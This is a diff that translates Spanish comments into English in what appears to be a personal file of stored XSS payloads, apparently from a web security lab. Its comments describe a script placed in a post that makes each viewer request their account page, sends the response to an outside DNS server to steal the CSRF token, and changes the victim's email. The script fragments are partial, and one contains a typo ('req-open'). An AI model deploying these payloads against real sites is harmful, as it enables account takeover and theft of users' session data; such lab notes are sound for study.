@@ -1,4 +1,5 @@
-// Esto es para que el usuario que vea el post, haga, de manera involuntaria, una petición a my-account y la respuesta nos la de a un servidor DNS (nos devolverá datos de  su cuenta). En el siguiente script vamos a robarle el csrf_token para poder tramitar nosotros a mano lo que queramos con su cuenta.
+// Stored XSS leading to CSRF Token Theft 
+// When a user views the post, they unintentionally send a request to my-account, and the response is sent to a DNS server (which will return data from their account). In the following script, we’ll steal their csrf_token so we can manually do whatever we want with their account.
 <script>
   var req = new XMLHttpRequest();
   req-open("GET", "/my-account", false);
@@ -21,7 +22,7 @@
 </script>
 
 
-// Esto es para que el usuario que vea el post, haga una petición a my-account y que directamente tramite el cambio de email a test@test.com
+// When a user views the post, they can submit a request to my-account, which will then directly process the email change to test@test.com
 <script>
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
